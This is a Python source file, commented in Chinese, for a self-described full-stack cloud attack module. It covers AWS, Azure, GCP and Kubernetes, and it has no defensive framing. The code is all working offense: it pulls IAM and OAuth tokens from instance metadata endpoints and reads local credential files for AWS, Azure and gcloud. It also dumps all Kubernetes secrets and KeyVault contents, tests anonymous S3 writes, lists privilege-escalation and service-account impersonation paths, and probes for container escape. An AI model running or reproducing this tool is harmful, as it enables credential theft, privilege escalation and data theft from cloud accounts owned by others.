"""
云安全攻击模块 - AWS/Azure/GCP/K8s 全栈云攻击
CloudAttack: 云环境侦察/权限提升/资源劫持/数据窃取
"""

import json, os, subprocess, tempfile, base64
from pathlib import Path
from datetime import datetime


class CloudAttack:
    """云平台攻击引擎 - AWS/Azure/GCP/Kubernetes"""

    def __init__(self):
        self.results = {"aws": {}, "azure": {}, "gcp": {}, "k8s": {}, "timestamp": str(datetime.now())}

    # ==================== 通用 ====================
    def detect_platform(self, target: str = "") -> dict:
        """检测目标云平台"""
        r = {"aws": False, "azure": False, "gcp": False, "k8s": False}
        # 检测AWS元数据
        try:
            out = subprocess.run("curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null", 
                               shell=True, capture_output=True, text=True, timeout=5)
            if "instance-id" in out.stdout or "ami-id" in out.stdout: r["aws"] = True
        except: pass
        # 检测Azure
        try:
            out = subprocess.run(
                "curl -s -H 'Metadata:true' --connect-timeout 3 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5)
            if "compute" in out.stdout: r["azure"] = True
        except: pass
        # 检测GCP
        try:
            out = subprocess.run(
                "curl -s -H 'Metadata-Flavor:Google' --connect-timeout 3 'http://169.254.169.254/computeMetadata/v1/instance/?recursive=true' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5)
            if "project" in out.stdout.lower(): r["gcp"] = True
        except: pass
        # 检测K8s
        try:
            out = subprocess.run(
                "curl -s --connect-timeout 3 -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)' "
                "https://kubernetes.default.svc/api/v1/namespaces 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5)
            if "namespaces" in out.stdout or '"items"' in out.stdout: r["k8s"] = True
        except: pass
        self.results["platform_detect"] = r
        return r

    # ==================== AWS ====================
    def aws_recon(self) -> dict:
        """AWS 环境侦察 - 枚举资源"""
        r = {}
        cmds = {
            "whoami": "aws sts get-caller-identity 2>/dev/null",
            "regions": "aws ec2 describe-regions --region us-east-1 2>/dev/null | jq -r '.Regions[].RegionName'",
            "instances": "aws ec2 describe-instances 2>/dev/null | jq '.Reservations[].Instances[] | {InstanceId,PublicIpAddress,PrivateIpAddress,InstanceType,State:.State.Name,Tags}'",
            "s3_buckets": "aws s3 ls 2>/dev/null",
            "iam_users": "aws iam list-users 2>/dev/null | jq -r '.Users[].UserName'",
            "iam_roles": "aws iam list-roles 2>/dev/null | jq -r '.Roles[] | {RoleName,Arn}'",
            "iam_policies": "aws iam list-policies --scope Local 2>/dev/null | jq -r '.Policies[] | {PolicyName,Arn}'",
            "lambda": "aws lambda list-functions 2>/dev/null | jq -r '.Functions[].FunctionName'",
            "rds": "aws rds describe-db-instances 2>/dev/null | jq '.DBInstances[] | {DBInstanceIdentifier,Endpoint,Engine,PubliclyAccessible}'",
            "secrets": "aws secretsmanager list-secrets 2>/dev/null | jq -r '.SecretList[].Name'",
            "ecr": "aws ecr describe-repositories 2>/dev/null | jq -r '.repositories[].repositoryUri'",
        }
        for name, cmd in cmds.items():
            try:
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                r[name] = out.stdout.strip()[:5000]
            except: r[name] = "error"
        self.results["aws"] = r
        return r

    def aws_credential_steal(self) -> dict:
        """AWS 凭证窃取 - 实例角色/SSM/凭据提供商"""
        r = {}
        try:
            # IMDSv1
            r["imdsv1_iam"] = subprocess.run(
                "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
            if r["imdsv1_iam"]:
                r["imdsv1_creds"] = subprocess.run(
                    f"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{r['imdsv1_iam']} 2>/dev/null",
                    shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
        except: pass
        try:
            # IMDSv2
            token = subprocess.run(
                "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds:21600' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
            if token:
                r["imdsv2_iam"] = subprocess.run(
                    f"curl -s -H 'X-aws-ec2-metadata-token:{token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
                    shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
                if r["imdsv2_iam"]:
                    r["imdsv2_creds"] = subprocess.run(
                        f"curl -s -H 'X-aws-ec2-metadata-token:{token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{r['imdsv2_iam']} 2>/dev/null",
                        shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
        except: pass
        try:
            # ~/.aws/credentials
            r["local_creds"] = open(Path.home() / ".aws/credentials", "r").read()[:3000] if (Path.home() / ".aws/credentials").exists() else "not found"
        except: pass
        try:
            # 环境变量
            for k in ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN"]:
                if os.getenv(k): r[f"env_{k}"] = "***SET***"
        except: pass
        self.results["aws_creds"] = r
        return r

    def aws_privilege_escalation(self) -> dict:
        """AWS 权限提升 - IAM策略滥用"""
        vectors = [
            ("iam:CreatePolicyVersion", "可创建新策略版本 - 提升权限"),
            ("iam:SetDefaultPolicyVersion", "可设置默认策略版本"),
            ("iam:CreateAccessKey", "可为任意用户创建AccessKey"),
            ("iam:CreateLoginProfile", "可为任意用户创建登录密码"),
            ("iam:UpdateAssumeRolePolicy", "可修改角色信任策略"),
            ("iam:AttachUserPolicy", "可直接附加管理员策略"),
            ("iam:PassRole + ec2:RunInstances", "可传递角色到EC2实例"),
            ("lambda:UpdateFunctionCode", "可修改Lambda函数代码获取角色权限"),
            ("cloudformation:CreateStack", "可通过CloudFormation创建管理员角色"),
            ("ssm:SendCommand", "可在EC2上执行命令"),
            ("s3:PutBucketPolicy", "可修改S3桶策略"),
            ("ec2:ModifyInstanceAttribute", "可修改实例属性"),
        ]
        r = {"high_risk_permissions": [], "exploitation_paths": []}
        try:
            user = subprocess.run("aws sts get-caller-identity 2>/dev/null | jq -r .Arn", shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
            if user:
                policies = subprocess.run(f"aws iam list-attached-user-policies --user-name {user.split('/')[-1]} 2>/dev/null", shell=True, capture_output=True, text=True, timeout=10)
                r["user"] = user
                r["policies"] = policies.stdout.strip()[:3000]
            # 权限枚举
            for perm, desc in vectors:
                action = perm.split(":")[1]
                svc = perm.split(":")[0]
                r["high_risk_permissions"].append({"permission": perm, "description": desc, "test_cmd": f"aws {svc} {action}"})
        except: pass
        self.results["aws_privesc"] = r
        return r

    def aws_s3_attack(self, bucket: str = "") -> dict:
        """S3 桶攻击 - 枚举/公开访问/文件窃取"""
        r = {}
        if bucket:
            tests = [
                ("list", f"aws s3 ls s3://{bucket}/ --no-sign-request 2>/dev/null"),
                ("list_auth", f"aws s3 ls s3://{bucket}/ 2>/dev/null"),
                ("policy", f"aws s3api get-bucket-policy --bucket {bucket} 2>/dev/null"),
                ("acl", f"aws s3api get-bucket-acl --bucket {bucket} 2>/dev/null"),
                ("public_block", f"aws s3api get-public-access-block --bucket {bucket} 2>/dev/null"),
                ("versioning", f"aws s3api get-bucket-versioning --bucket {bucket} 2>/dev/null"),
                ("website", f"aws s3api get-bucket-website --bucket {bucket} 2>/dev/null"),
                ("put_test", f"echo 'PoC' | aws s3 cp - s3://{bucket}/poc_test.txt --no-sign-request 2>/dev/null"),
            ]
            for name, cmd in tests:
                try:
                    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    r[name] = out.stdout.strip()[:2000] if out.stdout.strip() else out.stderr.strip()[:500]
                except: r[name] = "error"
        self.results["aws_s3"] = r
        return r

    # ==================== Azure ====================
    def azure_recon(self) -> dict:
        """Azure 环境侦察"""
        r = {}
        cmds = {
            "whoami": "az account show 2>/dev/null",
            "subscriptions": "az account subscription list 2>/dev/null",
            "resource_groups": "az group list 2>/dev/null",
            "vms": "az vm list --query '[].{name:name,location:location,resourceGroup:resourceGroup}' 2>/dev/null",
            "managed_identities": "az identity list 2>/dev/null",
            "keyvaults": "az keyvault list 2>/dev/null",
            "storage_accounts": "az storage account list 2>/dev/null",
            "sql_servers": "az sql server list 2>/dev/null",
            "app_services": "az webapp list 2>/dev/null",
            "acr": "az acr list 2>/dev/null",
            "aks": "az aks list 2>/dev/null",
            "role_assignments": "az role assignment list --all 2>/dev/null | head -2000",
        }
        for name, cmd in cmds.items():
            try:
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                r[name] = out.stdout.strip()[:5000]
            except: r[name] = "error"
        self.results["azure"] = r
        return r

    def azure_credential_steal(self) -> dict:
        """Azure 凭证窃取"""
        r = {}
        try:
            # IMDS
            r["imds_token"] = subprocess.run(
                "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5).stdout.strip()[:2000]
        except: pass
        try:
            # Azure CLI缓存
            cache_path = Path.home() / ".azure"
            if cache_path.exists():
                r["azure_dir"] = str(list(cache_path.rglob("*.*"))[:20])
                # accessTokens.json
                token_file = cache_path / "accessTokens.json"
                if token_file.exists():
                    r["access_tokens"] = open(token_file).read()[:5000]
        except: pass
        try:
            # MSI端点
            r["msi"] = subprocess.run(
                "curl -si 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' -H 'Metadata:true' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5).stdout.strip()[:3000]
        except: pass
        self.results["azure_creds"] = r
        return r

    def azure_keyvault_dump(self, vault_name: str = "") -> dict:
        """Azure KeyVault 数据导出"""
        r = {}
        if vault_name:
            try:
                r["secrets"] = subprocess.run(f"az keyvault secret list --vault-name {vault_name} 2>/dev/null", shell=True, capture_output=True, text=True, timeout=15).stdout.strip()[:5000]
                r["keys"] = subprocess.run(f"az keyvault key list --vault-name {vault_name} 2>/dev/null", shell=True, capture_output=True, text=True, timeout=15).stdout.strip()[:5000]
            except: pass
        self.results["azure_keyvault"] = r
        return r

    # ==================== GCP ====================
    def gcp_recon(self) -> dict:
        """GCP 环境侦察"""
        r = {}
        cmds = {
            "whoami": "gcloud auth list 2>/dev/null",
            "project": "gcloud config get-value project 2>/dev/null",
            "compute_instances": "gcloud compute instances list --format='table(name,zone,status)' 2>/dev/null",
            "service_accounts": "gcloud iam service-accounts list 2>/dev/null",
            "storage_buckets": "gcloud storage ls 2>/dev/null",
            "gke_clusters": "gcloud container clusters list 2>/dev/null",
            "cloud_functions": "gcloud functions list 2>/dev/null",
            "cloud_sql": "gcloud sql instances list 2>/dev/null",
            "secrets": "gcloud secrets list 2>/dev/null",
            "kms_keys": "gcloud kms keyrings list --location=global 2>/dev/null",
            "iam_roles": "gcloud iam roles list 2>/dev/null | head -2000",
        }
        for name, cmd in cmds.items():
            try:
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                r[name] = out.stdout.strip()[:5000]
            except: r[name] = "error"
        self.results["gcp"] = r
        return r

    def gcp_credential_steal(self) -> dict:
        """GCP 凭证窃取"""
        r = {}
        try:
            # IMDS
            r["imds_token"] = subprocess.run(
                "curl -s -H 'Metadata-Flavor:Google' 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token?scopes=https://www.googleapis.com/auth/cloud-platform' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5).stdout.strip()[:2000]
        except: pass
        try:
            # gcloud 配置
            cred_file = Path.home() / ".config/gcloud/application_default_credentials.json"
            if cred_file.exists():
                r["adc_creds"] = open(cred_file).read()[:3000]
        except: pass
        try:
            # 环境变量
            for k in ["GOOGLE_APPLICATION_CREDENTIALS", "GCLOUD_PROJECT"]:
                if os.getenv(k): r[f"env_{k}"] = os.getenv(k)
        except: pass
        try:
            # ssh keys
            r["gcloud_ssh"] = subprocess.run("gcloud compute os-login ssh-keys list 2>/dev/null", shell=True, capture_output=True, text=True, timeout=10).stdout.strip()[:3000]
        except: pass
        self.results["gcp_creds"] = r
        return r

    def gcp_sa_impersonation(self) -> dict:
        """GCP 服务账号模拟 - 权限提升"""
        r = {"impersonation_targets": []}
        try:
            sas = subprocess.run("gcloud iam service-accounts list --format=json 2>/dev/null", shell=True, capture_output=True, text=True, timeout=10)
            if sas.stdout:
                import json as _j
                accounts = _j.loads(sas.stdout)
                for sa in accounts:
                    email = sa.get("email", "")
                    r["impersonation_targets"].append({
                        "email": email,
                        "impersonate_cmd": f"gcloud auth activate-service-account --key-file=<KEY> {email}",
                        "token_cmd": f"gcloud auth print-access-token --impersonate-service-account={email}"
                    })
        except: pass
        self.results["gcp_impersonation"] = r
        return r

    # ==================== Kubernetes ====================
    def k8s_recon(self) -> dict:
        """Kubernetes 环境侦察"""
        r = {}
        cmds = {
            "namespaces": "kubectl get namespaces -o wide 2>/dev/null",
            "pods": "kubectl get pods --all-namespaces -o wide 2>/dev/null",
            "services": "kubectl get svc --all-namespaces 2>/dev/null",
            "secrets": "kubectl get secrets --all-namespaces 2>/dev/null",
            "configmaps": "kubectl get configmaps --all-namespaces 2>/dev/null",
            "nodes": "kubectl get nodes -o wide 2>/dev/null",
            "service_accounts": "kubectl get serviceaccounts --all-namespaces 2>/dev/null",
            "roles": "kubectl get roles --all-namespaces 2>/dev/null",
            "clusterroles": "kubectl get clusterroles 2>/dev/null",
            "clusterrolebindings": "kubectl get clusterrolebindings 2>/dev/null",
            "rbac_can_i": "kubectl auth can-i --list 2>/dev/null | head -200",
        }
        for name, cmd in cmds.items():
            try:
                out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                r[name] = out.stdout.strip()[:5000]
            except: r[name] = "error"
        self.results["k8s"] = r
        return r

    def k8s_secret_steal(self) -> dict:
        """Kubernetes 密钥窃取"""
        r = {}
        try:
            # 读取当前SA token
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            if os.path.exists(token_path):
                r["sa_token"] = open(token_path).read()[:2000]
                ns = open("/var/run/secrets/kubernetes.io/serviceaccount/namespace").read().strip() if os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/namespace") else ""
                r["namespace"] = ns
                # 尝试列出该命名空间的secrets
                if ns:
                    r["namespace_secrets"] = subprocess.run(
                        f"kubectl get secrets -n {ns} -o json 2>/dev/null",
                        shell=True, capture_output=True, text=True, timeout=10).stdout.strip()[:10000]
        except: pass
        try:
            # 尝试读取所有secrets
            r["all_secrets"] = subprocess.run(
                "kubectl get secrets --all-namespaces -o json 2>/dev/null | jq '.items[].data' 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=10).stdout.strip()[:10000]
        except: pass
        self.results["k8s_secrets"] = r
        return r

    def k8s_pod_escape_detect(self) -> dict:
        """K8s Pod逃逸路径检测"""
        r = {
            "high_risk_mounts": [],
            "privileged": False,
            "host_pid": False,
            "host_network": False,
            "host_ipc": False,
            "capabilities": [],
            "escape_vectors": []
        }
        try:
            # 检查特权模式
            caps = subprocess.run("cat /proc/1/status 2>/dev/null | grep -i capEff", shell=True, capture_output=True, text=True, timeout=3)
            if caps.stdout:
                r["cap_eff"] = caps.stdout.strip()
                r["capabilities"].append("cap_eff:" + caps.stdout.strip())
            # Docker socket
            if os.path.exists("/var/run/docker.sock"):
                r["escape_vectors"].append("docker_socket: /var/run/docker.sock 存在，可挂载")
            # 宿主机挂载
            mounts = subprocess.run("mount 2>/dev/null | grep -E '(host|root|proc|sys)'", shell=True, capture_output=True, text=True, timeout=3)
            if mounts.stdout:
                for line in mounts.stdout.strip().split("\n"):
                    r["high_risk_mounts"].append(line)
            # Cgroup逃逸
            if os.path.exists("/sys/fs/cgroup/cgroup"):
                r["escape_vectors"].append("cgroup_release_agent: 可能利用cgroup notify_on_release逃逸")
            # 内核模块
            if os.path.exists("/lib/modules"):
                r["escape_vectors"].append("kernel_modules: /lib/modules可见，可能加载内核模块")
            # CAP_SYS_ADMIN
            capsh = subprocess.run("capsh --print 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_ptrace|cap_sys_module'", shell=True, capture_output=True, text=True, timeout=3)
            if capsh.stdout:
                r["capabilities"].extend(capsh.stdout.strip().split("\n"))
                if "cap_sys_admin" in capsh.stdout:
                    r["escape_vectors"].append("cap_sys_admin: 可使用mount/cgroup逃逸")
            # hostPID
            if os.path.exists("/proc/1/ns/pid"):
                ns_out = subprocess.run("ls -la /proc/1/ns/ 2>/dev/null", shell=True, capture_output=True, text=True, timeout=3)
                if ns_out.stdout:
                    r["proc_ns"] = ns_out.stdout.strip()[:1000]
        except: pass
        self.results["k8s_escape"] = r
        return r

    # ==================== 综合攻击 ====================
    def full_cloud_attack(self, target: str = "") -> dict:
        """全平台云攻击 - 侦察→凭据→提权→数据"""
        platform = self.detect_platform(target)
        if platform["aws"]:
            self.aws_recon()
            self.aws_credential_steal()
            self.aws_privilege_escalation()
        if platform["azure"]:
            self.azure_recon()
            self.azure_credential_steal()
        if platform["gcp"]:
            self.gcp_recon()
            self.gcp_credential_steal()
            self.gcp_sa_impersonation()
        if platform["k8s"]:
            self.k8s_recon()
            self.k8s_secret_steal()
            self.k8s_pod_escape_detect()
        return self.report()

    def report(self) -> dict:
        return self.results


def cloud_attack(target: str = "", action: str = "full", **kwargs) -> str:
    """云攻击分发器"""
    ca = CloudAttack()
    try:
        if action == "detect":
            r = ca.detect_platform(target)
            active = [k for k, v in r.items() if v]
            return f"检测到云平台: {', '.join(active) if active else '无云环境'}"

        if action == "full" or action == "all":
            r = ca.full_cloud_attack(target)
            html = "<b>☁️ 云安全攻击报告</b>\n"
            for plat, data in r.items():
                if plat in ["timestamp", "platform_detect"]: continue
                if data:
                    html += f"\n<b>【 {plat.upper()} 】</b>\n"
                    html += f"<pre>{json.dumps(data, ensure_ascii=False, indent=2)[:8000]}</pre>\n"
            return html

        if action == "aws_recon":
            r = ca.aws_recon()
            return f"<b>AWS侦察</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"
        if action == "aws_creds":
            r = ca.aws_credential_steal()
            return f"<b>AWS凭据窃取</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:6000]}</pre>"
        if action == "aws_privesc":
            r = ca.aws_privilege_escalation()
            return f"<b>AWS权限提升</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"
        if action == "aws_s3":
            bucket = kwargs.get("bucket", "")
            r = ca.aws_s3_attack(bucket)
            return f"<b>S3桶攻击: {bucket}</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"

        if action == "azure_recon":
            r = ca.azure_recon()
            return f"<b>Azure侦察</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"
        if action == "azure_creds":
            r = ca.azure_credential_steal()
            return f"<b>Azure凭据窃取</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:6000]}</pre>"
        if action == "azure_keyvault":
            vault = kwargs.get("vault", "")
            r = ca.azure_keyvault_dump(vault)
            return f"<b>Azure KeyVault导出: {vault}</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"

        if action == "gcp_recon":
            r = ca.gcp_recon()
            return f"<b>GCP侦察</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"
        if action == "gcp_creds":
            r = ca.gcp_credential_steal()
            return f"<b>GCP凭据窃取</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:6000]}</pre>"
        if action == "gcp_impersonate":
            r = ca.gcp_sa_impersonation()
            return f"<b>GCP服务账号模拟</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"

        if action == "k8s_recon":
            r = ca.k8s_recon()
            return f"<b>K8s侦察</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"
        if action == "k8s_secrets":
            r = ca.k8s_secret_steal()
            return f"<b>K8s密钥窃取</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"
        if action == "k8s_escape_detect":
            r = ca.k8s_pod_escape_detect()
            return f"<b>K8s逃逸路径检测</b>\n<pre>{json.dumps(r, ensure_ascii=False, indent=2)[:8000]}</pre>"

        return f"?cloud_attack action={action}"
    except Exception as e:
        return f"E:cloud_attack {e}"
